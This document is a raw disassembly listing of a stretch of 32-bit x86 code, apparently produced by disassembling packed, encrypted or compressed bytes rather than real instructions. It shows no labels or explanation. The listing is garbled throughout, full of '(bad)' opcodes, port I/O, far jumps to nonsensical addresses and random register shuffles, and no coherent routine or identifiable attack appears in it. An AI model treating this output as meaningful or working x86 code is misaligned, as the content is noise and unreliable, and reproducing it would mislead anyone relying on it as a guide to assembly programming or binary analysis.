  40ca7e:	fistp  WORD PTR [ebx-0xe743a66]
  40ca84:	pop    edi
  40ca85:	inc    esp
  40ca86:	sbb    eax,0xb76e7a55
  40ca8b:	mov    al,0xe5
  40ca8d:	add    ecx,DWORD PTR [edi-0x1845d282]
  40ca93:	daa    
  40ca94:	add    edi,DWORD PTR [edx-0x14307b20]
  40ca9a:	add    bl,BYTE PTR es:[edi-0x75]
  40ca9e:	jb     0x40caeb
  40caa0:	rol    DWORD PTR [eax],0x0
  40caa3:	ja     0x40cafb
  40caa5:	inc    esp
  40caa6:	push   eax
  40caa7:	rcl    BYTE PTR [esi-0x6ef644c3],0x8c
  40caae:	(bad)  
  40caaf:	or     BYTE PTR [edx],dh
  40cab1:	sbb    dl,BYTE PTR [esi*1+0x6c02def0]
  40cab8:	mov    edx,DWORD PTR [esi+0x3f]
  40cabb:	xchg   DWORD PTR [ebp+0x1e],ebp
  40cabe:	call   0xb1222c14
  40cac3:	or     al,0xfe
  40cac5:	pop    ds
  40cac6:	out    0x6a,eax
  40cac8:	mov    bl,0x21
  40caca:	ja     0x40cb24
  40cacc:	cli    
  40cacd:	nop
  40cace:	in     al,0x87
  40cad0:	aad    0x33
  40cad2:	and    DWORD PTR [edx],edx
  40cad4:	nop
  40cad5:	(bad)  [ecx+eax*8-0x4c]
  40cad9:	(bad)  
  40cada:	lock outs dx,BYTE PTR ds:[esi]
  40cadc:	lods   eax,DWORD PTR ds:[esi]
  40cadd:	mov    eax,ds:0x312d0da5
  40cae2:	sbb    eax,0x7fa22082
  40cae7:	pushf  
  40cae8:	add    ah,ch
  40caea:	lods   al,BYTE PTR ds:[esi]
  40caeb:	fbstp  TBYTE PTR [esi]
  40caed:	mov    edi,0xc568f1e5
  40caf2:	(bad)  
  40caf4:	mov    al,0x75
  40caf6:	jnp    0x40cb3f
  40caf8:	jmp    0x40cb6f
  40cafa:	mov    esp,0xf1be0a8d
  40caff:	xchg   ebp,eax
  40cb00:	ja     0x40caef
  40cb02:	sbb    al,0x4
  40cb04:	call   0x4fb3:0x4fa4afee
  40cb0b:	call   0x5c165435
  40cb10:	sub    ch,BYTE PTR [ecx]
  40cb12:	les    ebx,FWORD PTR ds:0x7d2f8665
  40cb18:	push   0x3f
  40cb1a:	sbb    BYTE PTR [edi+0x62e0f146],dl
  40cb20:	in     al,0x93
  40cb22:	push   ss
  40cb23:	mov    ecx,0x87a80500
  40cb28:	iret   
  40cb29:	ss jae 0x40cac9
  40cb2c:	pop    es
  40cb2d:	test   eax,0x2d8cbb7a
  40cb32:	mov    eax,DWORD PTR [edx]
  40cb34:	stos   DWORD PTR es:[edi],eax
  40cb35:	mov    BYTE PTR [ebx-0x31196d05],bh
  40cb3b:	inc    esi
  40cb3c:	push   eax
  40cb3d:	in     al,dx
  40cb3e:	push   cs
  40cb3f:	sub    DWORD PTR [ecx-0x860064d],ebp
  40cb45:	dec    edi
  40cb46:	fst    DWORD PTR [edx+0x2b15ad60]
  40cb4d:	mov    ds:0xa455c2b9,eax
  40cb52:	sub    ecx,DWORD PTR [eax+0x1ea93446]
  40cb58:	and    BYTE PTR [eax-0x6dd6435e],ah
  40cb5e:	xlat   BYTE PTR ds:[ebx]
  40cb5f:	inc    ecx
  40cb60:	sub    BYTE PTR [edi+0x441b0dd9],dh
  40cb66:	out    dx,al
  40cb67:	jbe    0x40cbb2
  40cb69:	mov    edx,DWORD PTR [ebx]
  40cb6b:	pop    esi
  40cb6c:	(bad)  [esi-0x27]
  40cb6f:	ins    DWORD PTR es:[edi],dx
  40cb70:	cmp    BYTE PTR [edx],bh
  40cb72:	(bad)  
  40cb73:	sbb    al,BYTE PTR [ebp-0x17]
  40cb76:	add    DWORD PTR [ecx+edx*8+0x3948d2ca],ecx
  40cb7d:	call   0xb197:0x4c970c3e
  40cb84:	xchg   esi,eax
  40cb85:	cld    
  40cb86:	pop    ebx
  40cb87:	xchg   esp,eax
  40cb88:	pop    edi
  40cb89:	popf   
  40cb8a:	fnstsw WORD PTR [edi]
  40cb8c:	add    DWORD PTR [ecx],edx
  40cb8e:	mov    WORD PTR [edx],ss
  40cb90:	push   ecx
  40cb91:	inc    ebx
  40cb92:	add    al,0xcc
  40cb94:	add    eax,0xf7c51f3
  40cb99:	push   ss
  40cb9a:	xchg   DWORD PTR [esi+0x1181641c],edx
  40cba0:	push   ss
  40cba1:	mov    al,ds:0x8366270
  40cba6:	outs   dx,BYTE PTR ds:[esi]
  40cba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cba8:	xchg   DWORD PTR [ebp+0x6dc432e2],edx
  40cbae:	sbb    edx,edx
  40cbb0:	in     eax,0xd8
  40cbb2:	std    
  40cbb3:	aam    0x57
  40cbb5:	add    ebp,DWORD PTR [ebx-0x5d4fc92]
  40cbbb:	lea    ebp,[eax-0x1a31841c]
  40cbc1:	push   edx
  40cbc2:	stos   DWORD PTR es:[edi],eax
  40cbc3:	loope  0x40cb5e
  40cbc5:	lock adc ch,BYTE PTR [esi]
  40cbc8:	retf   0x4b7d
  40cbcb:	(bad)  
  40cbcc:	std    
  40cbcd:	mov    al,0x3c
  40cbcf:	mov    ds:0xb5eb233d,eax
  40cbd4:	push   esp
  40cbd5:	xor    DWORD PTR ds:0x84fbabe8,edi
  40cbdb:	cld    
  40cbdc:	(bad)  
  40cbdd:	shl    DWORD PTR [edi],cl
  40cbdf:	iret   
  40cbe0:	inc    esp
  40cbe1:	mov    bh,0x8a
  40cbe3:	and    DWORD PTR [eax-0x27b0d52f],eax
  40cbe9:	ins    BYTE PTR es:[edi],dx
  40cbea:	xor    BYTE PTR [eax+ecx*2-0x7f1c93e4],ah
  40cbf1:	mov    BYTE PTR [ebx+0x43],ah
  40cbf4:	inc    esp
  40cbf5:	cwde   
  40cbf6:	push   cs
  40cbf7:	hlt    
  40cbf8:	bound  ebp,QWORD PTR [esi]
  40cbfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbfb:	(bad)  
  40cbfc:	cld    
  40cbfd:	xchg   ebx,eax
  40cbfe:	not    DWORD PTR [esi+0x2f3ced2a]
  40cc04:	pop    edx
  40cc05:	int3   
  40cc06:	dec    edx
  40cc07:	dec    esi
  40cc08:	outs   dx,DWORD PTR ds:[esi]
  40cc09:	out    0x33,al
  40cc0b:	ret    
  40cc0c:	fdivrp st(7),st
  40cc0e:	cli    
  40cc0f:	in     al,dx
  40cc10:	aaa    
  40cc11:	sti    
  40cc12:	xchg   DWORD PTR [edi],ebp
  40cc14:	xor    eax,0x3d882bb2
  40cc19:	add    dh,BYTE PTR [edx-0x48de0406]
  40cc1f:	cmc    
  40cc20:	addr16 cli 
  40cc22:	push   esi
  40cc23:	or     eax,DWORD PTR [eax+0x641ee222]
  40cc29:	adc    DWORD PTR [edi+0x1c],ebx
  40cc2c:	mul    BYTE PTR [esi+0x27]
  40cc2f:	mov    ebx,0x571420d2
  40cc34:	xor    bh,BYTE PTR [eax+0x53]
  40cc37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc38:	sbb    esi,ebp
  40cc3a:	mov    eax,0x26d2278b
  40cc3f:	sbb    al,0x54
  40cc41:	and    ebp,DWORD PTR ds:0x8d518d18
  40cc47:	or     ebx,eax
  40cc49:	mov    ds:0xa18efb16,eax
  40cc4e:	addr16 inc eax
  40cc50:	sti    
  40cc51:	js     0x40ccb4
  40cc53:	data16 fsubp st(7),st
  40cc56:	hlt    
  40cc57:	cli    
  40cc58:	mov    al,0x71
  40cc5a:	jbe    0x40ccd7
  40cc5c:	fs jno 0x40cc22
  40cc5f:	cmp    bh,BYTE PTR [eax-0x6eaedcf]
  40cc65:	inc    eax
  40cc66:	out    dx,eax
  40cc67:	fst    DWORD PTR [ebx+0x38]
  40cc6a:	dec    eax
  40cc6b:	lods   eax,DWORD PTR ds:[esi]
  40cc6c:	xor    BYTE PTR [ecx],ch
  40cc6e:	shr    DWORD PTR ds:[edi-0x54673eaf],cl
  40cc75:	xchg   ebp,ebp
  40cc77:	pop    eax
  40cc78:	test   DWORD PTR [edi+ecx*8-0x43],esi
  40cc7c:	mov    cl,0x8f
  40cc7e:	dec    edx
  40cc7f:	cld    
  40cc80:	scas   eax,DWORD PTR es:[edi]
  40cc81:	jo     0x40cc77
  40cc83:	or     BYTE PTR [ebx+esi*4],cl
  40cc86:	es mov ebx,0x60cdb0f9
  40cc8c:	dec    edi
  40cc8d:	test   al,0x7
  40cc8f:	add    ah,BYTE PTR [edx]
  40cc91:	in     eax,0xbf
  40cc93:	add    bh,dh
  40cc95:	dec    edi
  40cc96:	mov    BYTE PTR [edx],al
  40cc98:	lods   eax,DWORD PTR ds:[esi]
  40cc99:	mov    ds:0xe0e76cc9,eax
  40cc9e:	leave  
  40cc9f:	jl     0x40cc43
  40cca1:	fsubrp st(1),st
  40cca3:	aaa    
  40cca4:	retf   
  40cca5:	sub    DWORD PTR [ebp-0x5c],esp
  40cca8:	jle    0x40cc8e
  40ccaa:	(bad)  
  40ccab:	psubsw mm1,QWORD PTR [ecx-0x4a197f8b]
  40ccb2:	mov    WORD PTR [esi-0x14fb551a],ss
  40ccb8:	out    0xd1,eax
  40ccba:	sub    esi,DWORD PTR [ebx+0x68bfaa6]
  40ccc0:	and    ah,BYTE PTR [ecx]
  40ccc2:	cmp    BYTE PTR [eax+0x4e],ah
  40ccc5:	(bad)  
  40ccc6:	mov    ebp,0x4518a34b
  40cccb:	fmul   QWORD PTR [esi+0x4268e39d]
  40ccd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccd2:	out    dx,eax
  40ccd3:	cs daa 
  40ccd5:	iret   
  40ccd6:	pop    ebx
  40ccd7:	sub    eax,0xff2acfbf
  40ccdc:	out    0xd6,al
  40ccde:	and    bl,cl
  40cce0:	and    eax,0xdf06d959
  40cce5:	or     edi,edx
  40cce7:	stos   DWORD PTR es:[edi],eax
  40cce8:	sbb    al,dl
  40ccea:	dec    eax
  40cceb:	fidivr WORD PTR [esi]
  40cced:	xchg   edi,eax
  40ccee:	xor    BYTE PTR [ebp+0x5a7f97ca],bh
  40ccf4:	scas   eax,DWORD PTR es:[edi]
  40ccf5:	aaa    
  40ccf6:	add    BYTE PTR [esp+ebp*4],0x8f
  40ccfa:	dec    ecx
  40ccfb:	dec    DWORD PTR [edx]
  40ccfd:	cld    
  40ccfe:	push   es
  40ccff:	jae    0x40ccd9
  40cd01:	mov    dh,0xa7
  40cd03:	cmp    eax,ebp
  40cd05:	jbe    0x40ccb6
  40cd07:	repnz aam 0xe8
  40cd0a:	or     DWORD PTR [eax*8-0x44cce70f],esi
  40cd11:	mov    DWORD PTR ds:0xa127b543,eax
  40cd17:	jmp    0x4d5f:0x3b6facef
  40cd1e:	xchg   edx,eax
  40cd1f:	popf   
  40cd20:	sub    bh,BYTE PTR cs:[eax]
  40cd23:	ins    DWORD PTR es:[edi],dx
  40cd24:	mov    al,ds:0x44bf901d
  40cd29:	out    0xc6,al
  40cd2b:	mov    ?,eax
  40cd2d:	mov    esp,ebx
  40cd2f:	sbb    eax,0x210fb520
  40cd34:	adc    al,0xd4
  40cd36:	sub    DWORD PTR [ecx],eax
  40cd38:	xchg   edx,eax
  40cd39:	inc    eax
  40cd3a:	cdq    
  40cd3b:	xor    al,0xc4
  40cd3d:	and    al,0xf2
  40cd3f:	and    ebp,edx
  40cd41:	out    dx,eax
  40cd42:	ficomp WORD PTR [esi]
  40cd44:	pop    ebx
  40cd45:	mov    ecx,0x41903860
  40cd4a:	out    dx,al
  40cd4b:	sub    BYTE PTR [ecx-0x6f],0xd1
  40cd4f:	(bad)
  40cd53:	push   ss
  40cd54:	fidivr WORD PTR [edx+0x5a63a355]
  40cd5a:	retf   
  40cd5b:	out    0xbf,al
  40cd5d:	xor    BYTE PTR [edx+0x667f8d95],bl
  40cd63:	pop    es
  40cd64:	mov    ebx,0xa91c23a6
  40cd69:	jno    0x40cd47
  40cd6b:	jae    0x40cd9d
  40cd6d:	fist   DWORD PTR [edx+0x12]
  40cd70:	nop
  40cd71:	cmc    
  40cd72:	montmul (bad)
  40cd73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd74:	add    eax,0x869e4df2
  40cd79:	repnz loop 0x40cd9e
  40cd7c:	je     0x40cdc8
  40cd7e:	sbb    DWORD PTR [ebx+0x53587f92],edx
  40cd84:	sub    dh,BYTE PTR [ebx]
  40cd86:	sbb    DWORD PTR [esi+0x2a],esi
  40cd89:	push   ebp
  40cd8a:	dec    esp
  40cd8b:	or     eax,0xbc47f3e3
  40cd90:	mov    cl,0xb5
  40cd92:	mul    bh
  40cd94:	mov    edx,0xfc530647
  40cd99:	lock or al,0x96
  40cd9c:	pop    ds
  40cd9d:	xor    BYTE PTR [esi],dl
  40cd9f:	pop    ds
  40cda0:	xchg   edx,eax
  40cda1:	dec    ecx
  40cda2:	aaa    
  40cda3:	inc    ebx
  40cda4:	cmp    BYTE PTR [ebx+0x12c10da0],dl
  40cdaa:	daa    
  40cdab:	test   al,0x76
  40cdad:	fcmovb st,st(0)
  40cdaf:	je     0x40cdbd
  40cdb1:	retf   
  40cdb2:	aas    
  40cdb3:	shl    DWORD PTR [ebx+ebp*4+0x1c32a867],1
  40cdba:	test   al,0x4a
  40cdbc:	lds    esp,FWORD PTR [esi-0x13]
  40cdbf:	faddp  st(6),st
  40cdc1:	add    DWORD PTR [ecx+esi*4-0x599c733b],esi
  40cdc8:	mov    ebx,esi
  40cdca:	and    ebx,DWORD PTR [ebp-0x1f]
  40cdcd:	mov    al,ds:0x26c9cb2b
  40cdd2:	pop    ss
  40cdd3:	push   edx
  40cdd4:	mov    dl,0x72
  40cdd6:	mov    eax,0x6b4cd71f
  40cddb:	popa   
  40cddc:	jmp    0xda0a:0xbd809c59
  40cde3:	mov    eax,ds:0x849f2bab
  40cde8:	bnd jne 0x40cddf
  40cdeb:	sbb    ebp,DWORD PTR [eax-0x7766addc]
  40cdf1:	xchg   ebx,eax
  40cdf2:	das    
  40cdf3:	mov    ch,dl
  40cdf5:	sub    bl,BYTE PTR [ebp-0x78ea394d]
  40cdfb:	inc    ebx
  40cdfc:	imul   edi,DWORD PTR [edx-0x23],0x39
  40ce00:	faddp  st(5),st
  40ce02:	nop
  40ce03:	shr    DWORD PTR [ebp-0x70ba43e1],0x22
  40ce0a:	jae    0x40cd9d
  40ce0c:	mov    al,0x60
  40ce0e:	jno    0x40ce07
  40ce10:	pop    ebx
  40ce11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce12:	mov    esp,0xa3f1fc7c
  40ce17:	sbb    DWORD PTR [esp+ecx*4-0x20],0x55fe7a6a
  40ce1f:	jo     0x40cdb0
  40ce21:	jg     0x40ce30
  40ce23:	jb     0x40ce27
  40ce25:	add    DWORD PTR [ebp-0x10],ebx
  40ce28:	adc    al,0x51
  40ce2a:	sbb    ecx,0x33
  40ce2d:	std    
  40ce2e:	mov    eax,ds:0x36d40549
  40ce33:	mov    esp,eax
  40ce35:	pop    ss
  40ce36:	mov    si,0xdde9
  40ce3a:	cmc    
  40ce3b:	je     0x40ce17
  40ce3d:	out    dx,al
  40ce3e:	mov    DWORD PTR [ecx+edx*1+0x26b5c762],ebx
  40ce45:	mov    al,ds:0xfa90df05
  40ce4a:	jns    0x40ce2a
  40ce4c:	dec    esp
  40ce4d:	fisttp QWORD PTR [edx-0x1418d78a]
  40ce53:	cmp    bl,BYTE PTR [eax+0x5b80f35c]
  40ce59:	mov    ah,0x5b
  40ce5b:	mov    esi,0x49221dd3
  40ce60:	push   0x3c
  40ce62:	clc    
  40ce63:	iret   
  40ce64:	add    esp,ecx
  40ce66:	adc    ah,BYTE PTR [eax]
  40ce68:	imul   DWORD PTR [ebp-0x51]
  40ce6b:	cli    
  40ce6c:	lods   al,BYTE PTR ds:[esi]
  40ce6e:	sete   BYTE PTR [eax-0x6234094c]
  40ce75:	leave  
  40ce76:	call   FWORD PTR [edi]
  40ce78:	mov    bh,0x2c
  40ce7a:	ficom  WORD PTR [eax-0x51]
  40ce7d:	jmp    0x41d01db8
  40ce82:	add    DWORD PTR [ebp+0x4fade6c7],ebx
  40ce88:	data16 data16 stc 
  40ce8b:	imul   edx,DWORD PTR [ebp-0x29c401e0],0xffffffa4
  40ce92:	or     DWORD PTR [ecx+0x31],edi
  40ce95:	mov    ecx,?
  40ce97:	mov    ebp,0xd50db017
  40ce9c:	ss pop esi
  40ce9e:	dec    ebp
  40ce9f:	pop    edx
  40cea0:	test   BYTE PTR [ebp-0x6b4e6d66],ah
  40cea6:	mov    ecx,0x4a8a25d2
  40ceab:	js     0x40ce6e
  40cead:	jb     0x40ce34
  40ceaf:	cmp    BYTE PTR fs:[edi+ebx*1],cl
  40ceb3:	xchg   edx,eax
  40ceb4:	sbb    DWORD PTR [ebx],0x4225b475
  40ceba:	mov    edi,0x2eebc056
  40cebf:	dec    ebx
  40cec0:	mov    BYTE PTR [ecx+0x64],ah
  40cec3:	sub    al,0xbe
  40cec5:	in     al,dx
  40cec6:	mov    dh,0xea
  40cec8:	fadd   DWORD PTR [ecx]
  40ceca:	xchg   ebp,eax
  40cecb:	rol    BYTE PTR [eax+0x4b],cl
  40cece:	enter  0x8159,0x13
  40ced2:	lahf   
  40ced3:	inc    esi
  40ced4:	mov    eax,0xb0b06f1e
  40ced9:	push   esp
  40ceda:	add    eax,0x43b075da
  40cedf:	inc    edi
  40cee0:	inc    al
  40cee2:	and    DWORD PTR [esi+0x60f2939a],0xdaab3d15
  40ceec:	mov    ch,0xfe
  40ceee:	stos   DWORD PTR es:[edi],eax
  40ceef:	jmp    0x40cefc
  40cef1:	in     eax,dx
  40cef2:	mov    edx,0x1c9be5ca
  40cef7:	mov    dl,0xf
  40cef9:	fs or  eax,0x5430a175
  40ceff:	outs   dx,BYTE PTR ds:[esi]
  40cf00:	cs mov ah,cl
  40cf03:	add    al,0x85
  40cf05:	ror    BYTE PTR [ecx-0x39],cl
  40cf08:	in     eax,0x10
  40cf0a:	popa   
  40cf0b:	cdq    
  40cf0c:	(bad)  
  40cf0d:	(bad)  
  40cf0e:	popa   
  40cf0f:	mov    DWORD PTR [ebx-0x6a],ebx
  40cf12:	push   ds
  40cf13:	lahf   
  40cf14:	imul   esp,DWORD PTR [edi-0x45],0xffffffe8
  40cf18:	adc    ah,BYTE PTR [ebx]
  40cf1a:	xlat   BYTE PTR ds:[ebx]
  40cf1b:	(bad)  
  40cf1c:	xor    cl,BYTE PTR [ebx]
  40cf1e:	shl    dl,1
  40cf20:	ret    
  40cf21:	in     al,dx
  40cf22:	rcl    BYTE PTR [ecx-0x69],1
  40cf25:	jae    0x40cf8a
  40cf27:	fucomp st(7)
  40cf29:	aaa    
  40cf2a:	add    eax,DWORD PTR [ebp-0x5e]
  40cf2d:	jbe    0x40cf63
  40cf2f:	sub    bh,dh
  40cf31:	jnp    0x40cf74
  40cf33:	push   edi
  40cf34:	cmp    BYTE PTR [edx+0x5636f8fe],ah
  40cf3a:	(bad)  
  40cf3b:	outs   dx,DWORD PTR ds:[esi]
  40cf3c:	pop    ds
  40cf3d:	imul   ebp,DWORD PTR [ecx],0x2f
  40cf40:	aam    0xa2
  40cf42:	addr16 imul eax,eax,0xb881e2f4
  40cf49:	dec    edx
  40cf4a:	push   ebp
  40cf4b:	inc    ebp
  40cf4c:	adc    eax,0xf71919c7
  40cf51:	and    DWORD PTR [esi+0x3087ff97],ebx
  40cf57:	ds lahf 
  40cf59:	(bad)  
  40cf5a:	(bad)  
  40cf5b:	push   cs
  40cf5c:	ins    BYTE PTR es:[edi],dx
  40cf5d:	rcr    DWORD PTR [eax+0x34d89567],1
  40cf63:	out    dx,eax
  40cf64:	sub    DWORD PTR [eax],0xdf1ecf00
  40cf6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf6b:	scas   eax,DWORD PTR es:[edi]
  40cf6c:	sbb    eax,0x7d575a49
  40cf71:	ss jne 0x40cf3d
  40cf74:	fwait
  40cf75:	xchg   edx,edx
  40cf77:	jne    0x40cf8c
  40cf79:	stc    
  40cf7a:	jecxz  0x40cfac
  40cf7c:	retf   
  40cf7d:	add    DWORD PTR [ebx+0x7836343e],edx
  40cf83:	dec    ebp
  40cf84:	sbb    DWORD PTR [ecx-0x64],ebp
  40cf87:	pop    edi
  40cf88:	jge    0x40d006
  40cf8a:	sbb    BYTE PTR [edi-0x5b],bh
  40cf8d:	fmul   QWORD PTR [edx-0x39d43818]
  40cf93:	lahf   
  40cf94:	pop    esp
  40cf95:	and    DWORD PTR [eax],edi
  40cf97:	aad    0x53
  40cf99:	fcmovnu st,st(2)
  40cf9b:	inc    eax
  40cf9c:	xchg   ecx,eax
  40cf9d:	or     DWORD PTR [esp+eax*2+0x5c86d26d],esi
  40cfa4:	mov    bh,0xad
  40cfa6:	add    bl,BYTE PTR [ecx+0x36bda377]
  40cfac:	stos   BYTE PTR es:[edi],al
  40cfad:	mov    al,BYTE PTR [edx+0x6d60a4ea]
  40cfb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfb4:	fwait
  40cfb5:	test   al,0x76
  40cfb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfb9:	(bad)  
  40cfba:	cwde   
  40cfbb:	inc    ebx
  40cfbc:	jne    0x40cf7a
  40cfbe:	inc    DWORD PTR [eax+esi*2]
  40cfc1:	sub    edi,ebp
  40cfc3:	jg     0x40cfe4
  40cfc5:	xor    DWORD PTR [ebp+0x77e75db1],edx
  40cfcb:	push   es
  40cfcc:	stc    
  40cfcd:	test   al,0xeb
  40cfcf:	(bad)  
  40cfd0:	fist   WORD PTR [ecx+0x5d28fb37]
  40cfd6:	loopne 0x40cf95
  40cfd8:	push   ss
  40cfd9:	ins    DWORD PTR es:[edi],dx
  40cfda:	or     al,0x2e
  40cfdc:	shr    DWORD PTR [edx],cl
  40cfde:	inc    edi
  40cfdf:	scas   al,BYTE PTR es:[edi]
  40cfe0:	mov    edx,0x1a3401aa
  40cfe5:	sbb    ecx,DWORD PTR [ecx]
  40cfe7:	jecxz  0x40cff2
  40cfe9:	jmp    0x9ccc6ff5
  40cfee:	xchg   edx,eax
  40cfef:	xor    DWORD PTR [esi],ecx
  40cff1:	adc    BYTE PTR [ecx],0x5e
  40cff4:	lea    ecx,[eax-0xa]
  40cff7:	test   BYTE PTR [ecx],dh
  40cff9:	sbb    al,0xcd
  40cffb:	sub    BYTE PTR [esi+0x558ae62c],0xbb
  40d002:	pop    ecx
  40d003:	rcl    DWORD PTR [ebx+ebx*2],0x17
  40d007:	pop    ebx
  40d008:	cdq    
  40d009:	jmp    0x5bf:0xf2f4c4c6
  40d010:	shld   DWORD PTR [ebp+0x3a],edx,cl
  40d014:	sahf   
  40d015:	fimul  DWORD PTR [ecx+edi*4-0xa]
  40d019:	leave  
  40d01a:	or     dl,dh
  40d01c:	inc    ebx
  40d01d:	shl    al,cl
  40d01f:	fsubr  st(2),st
  40d021:	add    BYTE PTR [ebp+0x3a],bl
  40d024:	outs   dx,BYTE PTR ds:[esi]
  40d025:	ds stos DWORD PTR es:[edi],eax
  40d027:	or     al,0x88
  40d029:	test   DWORD PTR [ecx+0x67bd74e3],edx
  40d02f:	sub    ch,BYTE PTR ss:[edi]
  40d032:	dec    ebx
  40d033:	mov    esp,0xce9453ec
  40d038:	push   eax
  40d039:	hlt    
  40d03a:	cli    
  40d03b:	shl    DWORD PTR [esi],cl
  40d03d:	mov    ah,BYTE PTR [edx+0x703f6d1c]
  40d043:	dec    esp
  40d044:	arpl   sp,bp
  40d046:	loope  0x40cff1
  40d048:	inc    ebp
  40d049:	push   esi
  40d04a:	in     eax,0xb2
  40d04c:	inc    ebx
  40d04d:	jmp    0xcc526bec
  40d052:	add    DWORD PTR [eax*4+0xde43a46],0xffffffde
  40d05a:	popa   
  40d05b:	daa    
  40d05c:	imul   ecx,eax,0x5
  40d05f:	mov    cl,0x8
  40d061:	push   ss
  40d062:	lock stc 
  40d064:	jmp    0x40d03f
  40d066:	arpl   WORD PTR [edx],dx
  40d068:	adc    eax,0x33de2279
  40d06d:	sbb    BYTE PTR [ebp+0x40],ch
  40d070:	xchg   eax,ebx
  40d072:	dec    edx
  40d073:	sbb    eax,DWORD PTR [ebp-0x66]
  40d076:	sbb    eax,DWORD PTR [edx+0x43]
  40d079:	iret   
  40d07a:	ss push ss
  40d07c:	sbb    BYTE PTR [ebx+eax*4-0x62520c0e],cl
  40d083:	les    ecx,FWORD PTR [edx]
  40d085:	inc    eax
  40d086:	scas   eax,DWORD PTR es:[edi]
  40d087:	scas   al,BYTE PTR es:[edi]
  40d088:	and    ecx,DWORD PTR [ebx-0x65]
  40d08b:	fsub   st(5),st
  40d08d:	pushf  
  40d08e:	push   0x49
  40d090:	js     0x40d108
  40d092:	jnp    0x40d08b
  40d094:	cmp    esp,DWORD PTR [edi]
  40d096:	xchg   ebp,eax
  40d097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d098:	xor    edx,0xdd73653d
  40d09e:	mov    edi,0x838230e7
  40d0a3:	in     al,dx
  40d0a4:	ins    BYTE PTR es:[edi],dx
  40d0a5:	ins    DWORD PTR es:[edi],dx
  40d0a6:	pop    es
  40d0a7:	sar    ch,1
  40d0a9:	xchg   eax,edx
  40d0ab:	mov    ds:0x21bfcb5a,al
  40d0b0:	dec    edi
  40d0b1:	mov    ah,0x20
  40d0b3:	test   BYTE PTR gs:[esi],0xb6
  40d0b7:	mov    dl,0x42
  40d0b9:	xchg   DWORD PTR [eax-0x46],edx
  40d0bc:	mov    esi,0x2a110e90
  40d0c1:	add    eax,0xa70f52d4
  40d0c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0c7:	clc    
  40d0c8:	mov    ecx,0x25972bed
  40d0cd:	wbinvd 
  40d0cf:	enter  0x1dff,0x46
  40d0d3:	iret   
  40d0d4:	dec    eax
  40d0d5:	xchg   esp,eax
  40d0d6:	jae    0x40d142
  40d0d8:	jmp    0x40d0ac
  40d0da:	dec    ebp
  40d0db:	test   BYTE PTR [edx+0x70b26e30],ah
  40d0e1:	mov    DWORD PTR [esi+0x7e],ebx
  40d0e4:	or     eax,0x101e5e29
  40d0e9:	shr    BYTE PTR [ecx+0x7b],1
  40d0ec:	adc    eax,0x36b10538
  40d0f1:	(bad)  
  40d0f2:	pusha  
  40d0f3:	mov    al,0x2f
  40d0f5:	sub    BYTE PTR [ecx+0x36dc5292],dl
  40d0fb:	and    dl,ch
  40d0fd:	cld    
  40d0fe:	or     BYTE PTR [ebp+ecx*1+0x7287c67c],dl
  40d105:	(bad)  
  40d106:	sbb    al,0x6
  40d108:	or     ebx,edx
  40d10a:	push   edi
  40d10b:	aad    0xea
  40d10d:	xor    al,0xfc
  40d10f:	pop    esi
  40d110:	call   0xf40cde6e
  40d115:	push   ss
  40d116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d117:	xchg   ebp,eax
  40d118:	into   
  40d119:	repz call 0x4c16:0x9192c312
  40d121:	cmp    al,ah
  40d123:	iret   
  40d124:	jne    0x40d0d5
  40d126:	cmp    eax,0xb19e50f9
  40d12b:	les    ebp,FWORD PTR [ebx]
  40d12d:	ins    DWORD PTR es:[edi],dx
  40d12e:	imul   edx,ebp,0xfffffff4
  40d131:	cwde   
  40d132:	jbe    0x40d156
  40d134:	cmp    DWORD PTR [edi],0xfffffffb
  40d137:	fld    st(0)
  40d139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d13a:	pop    es
  40d13b:	add    eax,DWORD PTR [edi]
  40d13d:	mov    ebx,DWORD PTR [ebp+0x25]
  40d140:	loopne 0x40d175
  40d142:	ret    
  40d143:	add    esi,0xd1047f0b
  40d149:	cmp    eax,0x56750821
  40d14e:	js     0x40d0d6
  40d150:	dec    BYTE PTR [ebx]
  40d152:	in     al,0xb3
  40d154:	dec    esp
  40d155:	(bad)  
  40d156:	nop
  40d157:	jne    0x40d1ab
  40d159:	ja     0x2ac2c017
  40d15f:	mov    ds:0xf7b4b48a,al
  40d164:	mov    eax,ds:0xef99dc00
  40d169:	popf   
  40d16a:	pusha  
  40d16b:	ss jle 0x40d18d
  40d16e:	outs   dx,BYTE PTR ds:[esi]
  40d16f:	inc    esp
  40d170:	and    eax,0x65e47f34
  40d175:	pop    edi
  40d176:	jp     0x40d16b
  40d178:	push   ds
  40d179:	repz out 0xf2,al
  40d17c:	push   edx
  40d17d:	out    dx,eax
  40d17e:	xor    BYTE PTR [ebx+0xe],ah
  40d181:	(bad)  
  40d182:	jmp    0x1aa6:0xeb3a153
  40d189:	mov    ebp,0x50009cf3
  40d18e:	loop   0x40d121
  40d190:	shr    ebx,cl
  40d192:	mov    bh,0x4
  40d194:	add    edi,DWORD PTR ds:0x9cad07f7
  40d19a:	scas   eax,DWORD PTR es:[edi]
  40d19b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d19c:	mov    bh,0xe
  40d19e:	scas   eax,DWORD PTR es:[edi]
  40d19f:	ja     0x40d168
  40d1a1:	test   BYTE PTR [ebx+0x4a086f18],0x77
  40d1a8:	push   eax
  40d1a9:	test   BYTE PTR [ebp-0x76],dh
  40d1ac:	shr    esp,1
  40d1ae:	xor    cl,dh
  40d1b0:	xchg   ebx,eax
  40d1b1:	add    edi,ecx
  40d1b3:	inc    edi
  40d1b4:	sub    cl,BYTE PTR [eax]
  40d1b6:	out    0x70,eax
  40d1b8:	pop    edx
  40d1b9:	arpl   WORD PTR [edi-0x78],sp
  40d1bc:	add    eax,eax
